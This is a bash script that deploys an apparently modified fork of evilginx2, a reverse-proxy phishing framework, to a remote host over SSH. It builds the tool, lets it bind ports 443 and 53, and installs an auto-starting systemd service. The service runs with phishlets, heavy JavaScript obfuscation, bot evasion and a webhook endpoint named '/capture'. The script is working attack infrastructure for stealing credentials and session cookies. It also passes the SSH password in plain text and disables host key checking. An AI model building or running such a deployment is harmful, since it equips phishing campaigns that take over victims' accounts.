#!/bin/bash
# deploy_offline.sh — Pro-feature #13 offline alternative: deploy the fork to an
# internal host over SSH (no internet needed on the target; tarball carries vendor).
#
# Usage:
#   ./deploy_offline.sh <target-host> <target-user> <ssh-password> [tarball] [install-dir]
# Defaults: tarball=/tmp/evilginx2-extended.tar.gz  install-dir=/home/<user>/evilginx2-lab
#
# Does: upload tarball -> extract -> setcap (bind :443/:53 unprivileged-ish) ->
# install systemd unit (auto-start) -> print next steps. Idempotent (safe re-run).
set -e

HOST="$1"; USER2="$2"; PASS="$3"; TARBALL="${4:-/tmp/evilginx2-extended.tar.gz}"; DIR="${5:-}"
[ -z "$HOST" ] && { echo "usage: $0 <host> <user> <password> [tarball] [install-dir]"; exit 1; }
DIR="${DIR:-/home/$USER2/evilginx2-lab}"
SSH="sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER2@$HOST"

[ -f "$TARBALL" ] || { echo "tarball missing: $TARBALL"; exit 1; }
echo "[1/5] upload tarball"
sshpass -p "$PASS" scp -o StrictHostKeyChecking=no "$TARBALL" "$USER2@$HOST:/tmp/deploy_ext.tar.gz"

echo "[2/5] extract + install"
$SSH "mkdir -p $DIR && rm -rf $DIR/src && tar xzf /tmp/deploy_ext.tar.gz -C $DIR && \
      mv $DIR/evilginx2-src $DIR/src && \
      cp $DIR/src/evilginx2-lab-placeholder 2>/dev/null; true"
$SSH "cd $DIR/src && go build -mod=vendor -o $DIR/evilginx2 . && cp -r phishlets $DIR/phishlets"

echo "[3/5] capabilities (bind :443/:53 as non-root)"
$SSH "echo $PASS | sudo -S setcap cap_net_bind_service=+ep $DIR/evilginx2 2>/dev/null"

echo "[4/5] systemd unit"
$SSH "echo $PASS | sudo -S tee /etc/systemd/system/evilginx2.service >/dev/null <<UNIT
[Unit]
Description=evilginx2-extended
After=network.target

[Service]
User=$USER2
WorkingDirectory=$DIR
ExecStart=$DIR/evilginx2 -p $DIR/phishlets -developer -api 9443 -jsobf ultra -botguard -bg-ua=false -webhook http://127.0.0.1:9090/capture
Restart=on-failure

[Install]
WantedBy=multi-user.target
UNIT
echo $PASS | sudo -S systemctl daemon-reload"

echo "[5/5] done"
echo "  start:   ssh $USER2@$HOST 'echo $PASS | sudo -S systemctl start evilginx2'"
echo "  control: egctl.py against https://$HOST:9443/api-<base> (certs in ~/.evilginx/api/ on the node)"
echo "  NOTE: first start creates config; set domain/hostname via console once, then restart unit."
